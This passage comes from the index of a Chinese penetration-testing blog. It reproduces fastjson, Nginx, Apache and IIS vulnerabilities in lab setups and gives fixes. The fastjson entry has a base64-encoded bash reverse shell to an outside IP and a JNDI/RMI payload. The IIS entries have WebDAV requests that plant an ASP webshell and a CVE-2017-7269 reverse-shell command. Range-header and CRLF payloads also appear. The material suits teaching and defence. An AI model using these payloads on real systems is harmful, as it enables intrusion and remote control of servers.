来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。\n组件版本的相互依赖关系：\n\n\n\n依赖项\n版本列表及依赖组件版本\n\n\n\nspring-boot-starter-parent\nspring-boot-starter-parent\n\n\nspring-boot-dependencies\nspring-boot-dependencies\n\n\nspring-cloud-dependencies\nspring-cloud-dependencies\n\n\nSpring Cloud 与 Spring Boot 版本之间的依赖关系：\n\n\n\nSpring Cloud 大版本\nSpring Boot 版本\n\n\n\nAngel\n兼容 Spring Boot 1.2.x\n\n\nBrixton\n兼容 Spring Boot 1.3.x、1.4.x\n\n\nCamden\n兼容 Spring Boot 1.4.x、1.5.x\n\n\nDalston\n兼容 Spring Boot 1.5.x，不兼容 2.0.x\n\n\nEdgware\n兼容 Spring Boot 1.5.x，不兼容 2.0.x\n\n\nFinchley\n兼容 Spring Boot 2.0.x，不兼容 1.5.x\n\n\nGreenwich\n兼容 Spring Boot 2.1.x\n\n\nHoxton\n兼容 Spring Boot 2.2.x\n\n\nSpring Cloud 小版本号的后缀及含义:\n\n\n\n小版本号后缀\n含义\n\n\n\nBUILD-SNAPSHOT\n快照版，代码不是固定，处于变化之中\n\n\nMX\n里程碑版\n\n\nRCX\n候选发布版\n\n\nRELEASE\n正式发布版\n\n\nSRX\n(修复错误和 bug 并再次发布的)正式发布版\n\n\n","slug":"spring boot介绍","date":"2021-10-13T12:56:08.395Z","categories_index":"渗透测试","tags_index":"渗透测试","author_index":"街溜子小王"},{"id":"27efebc17e75edd169130d3950d28289","title":"fastjson漏洞复现","content":"fastjson漏洞复现一、环境搭建cd vulhub&#x2F;fastjson&#x2F;1.2.24‐rce docker‐compose up ‐d\n\n访问http://IP:8090即可\n\n二、漏洞复现2.1漏洞判断    正常来说fastjson是没有指纹的，但是我们可以通过报错来判断，比如直接发送post数据或者加一个左花括号不闭合都可以\n\n2.2使用EXP开启服务java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMDQuNDQuOTUuMjM3Lzc3NzcgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;204.44.95.237&quot;\n\n其中:\n\n-C  - 远程class文件中要执行的命令。\n\n    （可选项 , 默认命令是mac下打开计算器，即”open /Applications/Calculator.app”）\n\n-A  - 服务器地址，可以是IP地址或者域名。\n\n    （可选项 , 默认地址是第一个网卡地址）\n将payload使用http://www.jackson-t.ca/runtime-exec-payloads.html编码（也可使用dnslog盲打）\n\n服务开启后自动打开监听\n\n2.3访问rmi服务修改访问方式为POST\n修改格式为Content-Type: application/json\n将服务的payload替换到请求包中\nPOST &#x2F; HTTP&#x2F;1.1\nHost: 192.168.10.29:8090\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;92.0.4515.131 Safari&#x2F;537.36\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q&#x3D;0.9\nConnection: close\nContent-Type: application&#x2F;json\nContent-Length: 160\n\n&#123;\n    &quot;b&quot;:&#123;\n        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,\n        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;204.44.95.237:1099&#x2F;xc8ffz&quot;,\n        &quot;autoCommit&quot;:true\n    &#125;\n&#125;\n\n开启监听\n\n发送请求包\n2.4拿到shell\n使用工具\n    https://github.com/welk1n/JNDI-Injection-Exploit/\n    burp插件：https://github.com/Maskhe/FastjsonScan\n参考文章\n    https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/README-CN.md\n    \n","slug":"fastjson漏洞复现","date":"2021-10-12T11:58:36.554Z","categories_index":"渗透测试","tags_index":"渗透测试","author_index":"街溜子小王"},{"id":"bd8f109f788216dc7b6a90406caac8fe","title":"Nginx漏洞","content":"Nginx是一款轻量级的Web 服务器/反向代理服务器及电子邮件（IMAP/POP3）代理服务器，在BSD-like协议下发行。其特点是占有内存少，并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好。\n一、文件解析漏洞1.1、漏洞描述    该漏洞是由于Nginx中php配置不当而造成的，与Nginx版本无关，但在高版本的php中，由于security.limit_extensions的引入，使得该漏洞难以被成功利用。\n\n    在已经上传了恶意1.jpg文件后，访问/1.jpg/xxx.php，（路径修复cgi.fix_pathinfo=1后）使得Nginx将其解析为php文件传给php-cgi程序（传给路径位于SERVER[&quot;SCRIPT_FILENAME&quot;]，修复去除路径位于SERVER[&quot;PATH_INFO&quot;]），但cgi程序将其解析为1.jpg并执行。\n\n1.2、漏洞复现使用phpstudy nginx php5.2.7\n\n\nNginx的处理程序和FastCGI处理程序不同导致\nNginx拿到URI为/1.jpg/xxx.php后，识别处后缀是.php，认为是php文件，转交给PHP FastCGI处理程序去处理。PHP FastCGI处理程序识别该URI： /1.jpg/xxx.php不存在，按照PHP FastCGI处理程序自己的规则，删去最后的/xxx.php，又看/1.jpg存在，就将/1.jpg当成要执行的文件，就成功解析。\nNginx传送给PHP FastCGI处理程序的路径可以在phpinfo中查看【传送路径查看】\n\ncgi.fix_pathinfo为php中的一个选项，默认开启为1，作用为修理路径，也就是对路径URI的处理规\n\n当php遇到文件路劲为/1.jpg/xxx.php/ss.001时，该文件不存在，会删除最后的/ss.001，再判断/1.jpg/xxx.php是否存在，若存在则将/1.jpg/xxx.php当作/1.jpg/xxx.php/ss.001文件，若不存在，则继续删除最后一个路径。删除的多余路径会存在PATH_INFO中，在这里为ss.001\n\n1.3、漏洞修复    1、 将php.ini文件中的cgi.fix_pathinfo的值设置为0,这样php再解析1.php/1.jpg这样的目录时,只要1.jpg不存在就会显示404页面\n\n    2、 php-fpm.conf中的security.limit_extensions后面的值设置为.php\n\n二、目录遍历漏洞2.1、漏洞描述Nginx的目录遍历与apache一样,属于配置方面的问题,错误的配置可导致目录遍历与源码泄露。\n2.2、漏洞复现修改nginx.conf,在如下图位置添加autoindex on\nautoindex on;\n\nautoindex on 开启目录浏览 autoindex off关闭目录浏览 默认是关闭状态\n\n2.3、漏洞修复    1.设置 autoindex off 关闭目录浏览\n\n    2.删除 autoindex on\n\n三、空字节代码执行漏洞3.1漏洞描述在使用PHP-FastCGI执行php的时候，URL里面在遇到%00空字节时与FastCGI处理不一致，导致可在非php文件中嵌入php代码，通过访问url+%00.php来执行其中的php代码。如：http://local/robots.txt.php会把robots.txt文件当作php来执行。\n影响版本：\nnginx 0.5.* \nnginx 0.6.* \nnginx 0.7 &lt;= 0.7.65 \nnginx 0.8 &lt;= 0.8.37\n\n3.2漏洞复现开启nginx\n\n在网站目录下添加1.jpg文件\n\n访问该文件\n\n4）抓包，添加%00\n这里由于该图非正常，在抓包时最后面添加..，可以让burpsuite抓到\n\n将请求修改为\n/1.jpg..php\n\n\n发包即可\n\n3.3、漏洞修复1.在nginx虚拟机配置或者fcgi.conf配置加如下代码：\nif ($request_filename ~* (.*)\\.php) &#123; \nset $php_url $1; \n&#125;\nif (!-e $php_url.php) &#123; \nreturn 403; \n&#125;\n\n2.升级 nginx\n四、整数溢处漏洞（CVE-2017-7529）4.1漏洞描述在 Nginx 的 range filter 中存在整数溢出漏洞，可以通过带有特殊构造的 range 的 HTTP 头的恶意请求引发这个整数溢出漏洞，并导致信息泄露。\n该漏洞影响所有 0.5.6 - 1.13.2版本内默认配置模块的Nginx只需要开启缓存攻击者即可发送恶意请求进行远程攻击造成信息泄露。当Nginx服务器使用代理缓存的情况下攻击者通过利用该漏洞可以拿到服务器的后端真实IP或其他敏感信息。\n通过我们的分析判定该漏洞利用难度低可以归属于low-hanging-fruit的漏洞在真实网络攻击中也有一定利用价值。\n4.2漏洞复现https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2017-7529\n检测脚本\n#!/usr/bin/env python \nimport sys \nimport requests \n\nif len(sys.argv) &lt; 2: \n\tprint(\"%s url\" % (sys.argv[0])) \n\tprint(\"eg: python %s http://your-ip:8080/\" % (sys.argv[0])) \n\tsys.exit() \nheaders = &#123; \n\t'User-Agent': \"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like \nGecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240\" \n&#125;\noffset = 605 \nurl = sys.argv[1] \nfile_len = len(requests.get(url, headers=headers).content) \nn = file_len + offset \nheaders['Range'] = \"bytes=-%d,-%d\" % ( \n\tn, 0x8000000000000000 - n) \nr = requests.get(url, headers=headers) \n\n4.3漏洞修复升级版本\n五、CRLF注入漏洞5.1漏洞描述Nginx将传入的url进行解码，对其中的%0a%0d替换成换行符，导致后面的数据注入至头部，造成CRLF注入漏洞。\n5.2漏洞复现设置https跳转，这样就可以接收到url，进而进行处理。在\nC:\\phpStudy\\PHPTutorial\\nginx\\conf\\nginx.conf文件中添加下面一行话。\nlocation / &#123; \n\treturn 302 https://$host$uri; \n&#125;\n\n\n构造url，访问\nhttp://192.168.0.155/%0ASet-cookie:JSPSESSID%3D3\nGET /%0ASet-cookie:JSPSESSID%3D3 HTTP/1.1 \nHost: 192.168.0.155 \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 \nFirefox/91.0 \nAccept: \ntext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 \nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 \nAccept-Encoding: gzip, deflate \nConnection: close \nUpgrade-Insecure-Requests: 1 \nCache-Control: max-age=0\n\n\n5.3漏洞修复1、删除配置不当的配置\n六、文件名逻辑漏洞（CVE-2013-4547）6.1漏洞描述这一漏洞的原理是非法字符空格和截止符（\\0）会导致Nginx解析URI时的有限状态机混乱，此漏洞可导致目录跨越及代码执行，其影响版本为：nginx 0.8.41 – 1.5.6\n6.2漏洞复现创建 1.jpg 文件，并上传\n抓包，在该文件最后添加一个空\n\n可以看到上传成功\n\n访问该文件，burpbuite抓包处理\n访问URL：http://192.168.112.111/1.jpg...php\n在burp的hex页面中将第一个点.改成20，第二个改为00\n\n6.3漏洞修复1.升级nginx\n","slug":"Nginx漏洞","date":"2021-10-09T12:23:40.945Z","categories_index":"渗透测试","tags_index":"渗透测试","author_index":"街溜子小王"},{"id":"fe97a5d550cfbb945b0d38253da8658e","title":"apache漏洞","content":"一、 未知扩展名解析漏洞（12server4）1.1、漏洞描述Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别，则继续向左识别，直到识别到合法后缀才进行解析。\n1.2、漏洞复现很好理解不截图了 我上传了一个名字叫lcx.php.qqq 的文件，当此特性存在的时候，一看.qqq不认识，继续解析，.php我认识，解析成php文件了。访问也是同理，比如访问phpinfo.php.qqq可成功显示phpinfo\n那么哪些后缀Apache不认识？\n不在mime.types当中的都不认识 （Multipurpose Internet Mail Extensions）\n到安装Apache的目录下找这个文件\n\n\n\n使用module模式与php结合的所有版本apache存在未知扩展名解析漏洞。\n\n使用fastcgi模式与php结合的所有版本apache不存在此漏洞。\n\n利用此漏洞时必须保证扩展名中至少带有一个.php，不然将默认作为txt/html文档处理。\n\n\nsudo service apache2 restart \ncd /etc/apache2/mods-enabled \nsudo vi php7.4.conf\n\n\n正则表达式中，$用来匹配字符串结尾位置。如果设置了RegExp对象的Multiline属性的条件下，还会匹配到字符串结尾的换行符”\\n”或”\\r”。 \n把$换成\\. 然后重启apache即可解析成php sudo service apache2 restart \n在/var/www/html 创建x.php.bak 并写入 &lt;?php phpinfo();?>\n\n\n1.3、修复建议解决方案一\n在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为.php.的访问权限：\n&lt;FilesMatch \".(php.|php3.|php4.|php5.)\"> \nOrder Deny,Allow \nDeny from all \n&lt;/FilesMatch> \n\n解决方案二\n如果需要保留文件名，可以修改程序源代码，替换上传文件名中的“.”为“_”：\n$filename = str_replace(‘.’, ‘_’, $filename);\n二、AddHandler导致的解析漏洞2.1、漏洞描述(1)apache在解析文件时有一个原则：当碰到不认识的扩展名时，将会从后往前解析，直到遇到认识的扩展名为止\n(2)如果都不认识将会暴露源码。\n在apache配置不当的时候就会造成apache解析漏洞。\n2.2、漏洞复现1、在httpd.conf 把注释去掉，后缀是存在.php .phtml都会解析成php文件\nAddType application/x-httpd-php .php .phtml\n\n\n2.3、修复建议1.在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为.php.的访问权限：\n&lt;FilesMatch \".(php.|php3.|php4.|php5.)\"> \nOrder Deny,Allow \nDeny from all \n&lt;/FilesMatch>\n\n2.把配置不当的文件进行修改\n三、 目录遍历漏洞3.1漏洞描述当客户端访问到一个目录时，Apache服务器将会默认寻找一个index list中的文件，若文 件不存在，则会列出当前目录下所有文件或返回403状态码，而列出目录下所有文件的行为称为目录遍历。\n3.2、漏洞复现httpd.conf\nDocumentRoot \"C:\\phpStudy\\WWW\" \n&lt;Directory /> \nOptions +Indexes +FollowSymLinks +ExecCGI \nAllowOverride All \nOrder allow,deny \nAllow from all \nRequire all granted \n&lt;/Directory>\n\n\n3.3、修复建议在httpd.conf文件中找到Options + Indexes + FollowSymLinks + ExecCGI并修改成Options -Indexes +FollowSymLinks + ExecCGI并保存（吧+修改为-）\n\nIndexes 允许目录浏览 \n\n— Indexes 禁止目录浏览 \n\n四、Apache HTTPD 换行解析漏洞（CVE-2017-15715）4.1、漏洞描述Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\\x0a将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。\n可以看到这里获取文件名是需要单独post一个name的，因为如果通过 $_FILES[‘file’][‘name’] 获取文件名的话，会把\\x0a自动去除，所以 $_FILES[‘file’][‘name’] 这种方式获取文件名就不会造成这个漏洞\n影响范围\napache ：2.4.0~2.4.29版本\n4.2、漏洞复现&lt;html> \n\t&lt;head>&lt;meta charset=\"utf-8\">&lt;/head> \n\t\t&lt;body>\n\t\t\t&lt;form action=\"\" method=\"post\" enctype=\"multipart/form-data\"> \n\t\t\t\t&lt;label for=\"file\">文件名：&lt;/label> \n\t\t\t\t&lt;input type=\"file\" name=\"file\" id=\"file\">&lt;br>\n\t\t\t\t &lt;input type=\"text\" name=\"name\" &lt;br>\n\t\t\t\t  &lt;input type=\"submit\" name=\"submit\" value=\"提交\"> \n\t\t\t&lt;/form> \n\t\t&lt;/body>\n\t\t&lt;/html> \n\t&lt;br /> \n\t&lt;?php \n\t\tif(isset($_FILES['file']))&#123;\n\t\t #1.php php \n\t\t $name =basename($_POST['name']);\n\t\t  $ext = pathinfo($name,PATHINFO_EXTENSION); $array=array('php','php3','php4','php5','phtml','pht'); \n\t\t  if(in_array($ext,$array))&#123; \n\t\t  \texit('bad file');\n\t\t  \t &#125;\n\t\t  \t move_uploaded_file($_FILES['file']['tmp_name'],'./'.$name); \n\t\t  \t&#125;\n\t\t  ?>\n\n后台是通过黑名单方式过滤了php后缀的文件，根据最开始的知识，什么样的文件算是php文件呢？在有定义，这句话的意思是以php结尾的文件都算php文件，在正则中表示匹配输入字符串的结尾位置。\n如果设置了 RegExp对象的 Multiline属性，则也匹配 \\n 或 \\r恰好，我们在文件末尾加了0x0a（n），所以被匹配成功了。\n0x0a和0x0d\n1.0x0d \\r CR这三者代表是回车，是同一个东西，回车的作用只是移动光标至该行的起始位置 \n2.0x0a \\n CL这三者代表换行，是同一个东西，换行至下一行行首起始位置； \n\n打开\nsudo docker stop charming_kare \nsudo docker rm charming_kare \nsudo docker images \nsudo docker run -d -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock -e \nVUL_IP=0.0.0.0 7ea558c9f385 \n进入容器 \nsudo docker exec -it practical_snyder /bin/bash\n\n","slug":"apache漏洞","date":"2021-10-09T10:28:19.782Z","categories_index":"渗透测试","tags_index":"渗透测试","author_index":"街溜子小王"},{"id":"0472d278667be4946aa7e2a62cbccec5","title":"IIS漏洞","content":"一、IIS6（03server）\n1.1、PUT文件上传漏洞1.1.1漏洞描述IIS Server 6.0在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。\n1.1.2漏洞复现1）开启 WebDAV 和写权限\n\n\n2）用burpsuite 提交OPTIONS 查看支持的协议\n\n上传一句话木马\nPUT /test.txt HTTP/1.1 \nHost: upload.moonteam.com \nContent-Length: 23\n\n&lt;%eval request(\"cmd\")%>\n\n\n重命名test.txt文件\nMOVE /test.txt HTTP/1.1 \nHost: upload.moonteam.com \nDestination: http://upload.moonteam.com/shell.asp\n\n\n\n\nshell.asp写入成功\n\n1.1.3漏洞修复1.关闭webdav\n2.关闭写入权限\n1.2、IIS解析漏洞1.2.1.1基于文件名漏洞描述该版本默认将*.asp;.jpg 此种格式的文件名，当成Asp解析。服务器默认不解析 ; 号及其后面的内容，相当于截断。\niis除了会将asp解析成脚本执行文件之外，还会将 cer cdx asa扩展名解析成asp\niis6.0-&gt;主目录-&gt;配置 查看 这几种扩展名都是指向同一个文件\nC:\\WINDOWS\\system32\\inetsrv\\asp.dll 所以都解析成asp\n\n1.2.1.2漏洞复现通过文件上传，或者创建文件，格式为*.asp;.jpg\n\n1.2.1.3漏洞修复1.禁止创建和上传此类畸形文件\n2.图片存放目录设置成禁止脚本文件执行\n3.升级iis版本\n1.2.2.1基于文件夹漏洞描述该版本默认将 *.asp/ 目录下的所有文件当成Asp解析。\n1.2.2.2漏洞复现创建文件.asp文件夹 上传图片格式后门到此目录\n\n1.2.2.3漏洞修复1.禁止创建此类文件夹\n3.升级iis版本\n1.3IIS短文件名漏洞1.3.1漏洞描述简介：Windows 以 8.3 格式生成与 MS-DOS 兼容的（短）文件名，以允许基于 MS-DOS 或 16 位Windows的程序访问这些文件。在cmd下输入”dir /x”即可看到短文件名的效果。\n\n当后缀小于4时，短文件名产生需要文件(夹)名前缀字符长度大于等于9位。\n当后缀大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名。\n目前IIS支持短文件名猜测的HTTP方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE六 种\nIIS 8.0之后的版本只能通过OPTIONS和TRACE方法被猜测成功\n1.3.2漏洞复现 IIS8.0以下版本需要开启ASP.NET支持，IIS&gt;=8.0版本,即使没有安装ASP.NET，通过OPTIONS和TRACE方法也可以猜解成功。以下通过开启IIS6.0 ASP.NET后进行复现。\n\n短文件名特征：\n1.只显示前6位的字符,后续字符用~1代替。其中数字1是可以递增。如果存在文件名类似的文件,则前面的6个字符是相同的,后面的数字进行递增\n\n2.后缀名最长只有3位,超过3位的会生成短文件名,且后缀多余的部分会截断\n3.所有小写字母均转换成大写的字母\n4.长文件名中包含多个”.”的时候,以文件最后一个”.”作为短文件名的后缀\n5.长文件名前缀/文件夹名字符长度符合0-9和A-Z、a-z范围且需要大于等于9位才会生成短文件名,如果包含空格或者其他部分特殊字符,不论长度均会生成短文件\n使用payload验证目标是否存在IIS短文件名漏洞,下图显示的404,说明目标存在该短文件名\n注：* 可以匹配n个字符, n可以为0 \nhttp://upload.moonteam.com/*~1*/a.aspx\n\n\n通过浏览器访问一个不存在的短文件名，会返回400状态码, 400说明该文件不存在\nhttp://upload.moonteam.com/zzzz*~1*/a.aspx\n\n\n4、通过浏览器访问上面两个payload,根据返回的结果,可以说明目标存在IIS短文件漏洞\n5、判断漏洞存在后,接下来手工详细分析猜解IIS短文件名\n在网站目录下新建一个 abcde1231111.txt文件,分别访问\nhttp://upload.moonteam.com/a*~1*/a.aspx \nhttp://upload.moonteam.com/b*~1*/a.aspx\n\n\n\n通过两次的提交确认了a是404 b是400 所以存在a文件开头的短文件。\n通过上面的方法接着往后猜\nhttp://upload.moonteam.com/abcde*~1*/a.aspx\n\n到这文件名已经出来了，接着就是判断是目录还是文件。\n\nhttp://upload.moonteam.com/abcde*~1/a.aspx\n\n\n判断是文件 按照a-z进行测试 404表示存在 400表示不存在 第一个字符不是a开头的文件\nhttp://upload.moonteam.com/abcde*~1.a*/a.aspx\n\n\n第一个是字符是t开头的，接着往后测试\nhttp://upload.moonteam.com/abcde*~1.t*/a.aspx\n\n\nhttp://upload.moonteam.com/abcde*~1.txt*/a.aspx\n\n\n6.按照上面的方法依次猜解得到该短文件名的后缀是txt 短文件名为 abcde~1.txt 可以接着猜解abcde1231111.txt文件名\n7.使用IIS短文件名扫描软件，获取目标存在哪些短文件名\npython iis_shortname_Scan.py http://upload.moonteam.com/\n\n\n1.3.3漏洞修复1、升级.net framework\n2、修改注册表键值：\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\n修改NtfsDisable8dot3NameCreation为1。修改完成后,需要重启系统生效。\n命令行关闭 fsutil behavior set disable8dot3 1\n新建文件 aaaaaaaaaaaaaazzzzz.txt 已经没有短文件名了。\n\n注:此方法只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除,需要重新复制才会消失。如果不重新复制，已经存在的短文件名则是不会消失的。\n将web文件夹的内容拷贝到另一个位置，如c:\\www到c:\\ww,然后删除原文件夹，再重命名c:\\ww到c:\\www\n1.4 iis RCE-CVE-2017-72691.4.1漏洞描述Microsoft windows Server 2003 R2中的 Interne信息服务IIS6.0中的 WebDAV服务中的ScStoragePathFromUrl函数中的缓冲区溢出允许远程攻击者通过以 If:&lt;http:// 开头的长标头执行任意代码 PROPFIND请求\n1.4.2漏洞复现WiNdows Server 2003 R2上使用IIS6.0并开启 WebDAV扩展\n\nhttps://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269\n\n\n\n\n\n\n\n\n\n脚本为python2版本\npython iis6\\ reverse\\ shell 192.168.0.115 80 192.168.0.116 9999\nnc -lnvp 9999\n\n\n1.4.3漏洞修复1.关闭 WebDav服务\n2.升级\n3.部署安全设备\n二、IIS7（08server）2.1文件解析漏洞2.1.1漏洞描述IIS7.x版本在Fast-CGl运行模式下，在任意文件，例：a001.jpg/png后面加上/.php，会将a001.jpg/png解析为php文件\n2.1.2漏洞复现上传图片到网站允许目录 在图片上加上/.php\nhttp://192.168.10.55:8980/1.jpg/.php\n\n\n2.1.3漏洞修复1.配置 cgi fix_pathinfo（php inil中）为0并重启php-cgi程序\n2.编辑映射模块-&gt;映射-&gt;打勾\n\n2.2HTTP.SYS远程代码执行(MS15-034)2.2.1漏洞描述HTTP.SYS是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.SYS\nHTTP.SYS远程代码执行漏洞实质是HTTP.SYS的整数溢出漏洞，当攻击者向受影响的Windows系统发送特殊设计的HTTP 请求，HTTP.sys 未正确分析时就会导致此漏洞，成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。\n主要存在Windows+IIS的环境下，任何安装了微软IIS 6.0以上的Windows Server 2008 R2/Server2012/Server 2012 R2以及Windows 7/8/8.1操作系统都受到这个漏洞的影响验证这个漏洞\n影响范围\nWindows7、Windows server 2008 R2、Windows8、Windows server2012、Windows8.1和\nWindows server 2012 R2\n影响版本\nIIS7.5、IIS8.0、IIS8.5\n2.2.2漏洞复现访问网站\n编辑请求头，增加Range: bytes=0-18446744073709551615字段，若返回码状态为416 Requested Range Not Satisfiable，则存在HTTP.SYS远程代码执行漏洞。\n\nGET / HTTP/1.1 \nHost: 192.168.0.148 \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 \nFirefox/91.0 \nAccept: \ntext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 \nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 \nAccept-Encoding: gzip, deflate \nConnection: close \nRange: bytes=0-18446744073709551615 \nContent-Length: 2\n\n\npoc 地址 https://github.com/davidjura/MS15-034-IIS-Active-DoS-Exploit-PoC\n\n2.2.3漏洞修复1.安装修复补丁（KB3042553）\n","slug":"IIS漏洞","date":"2021-10-09T10:26:44.575Z","categories_index":"渗透测试","tags_index":"渗透测试","author_index":"街溜子小王"}]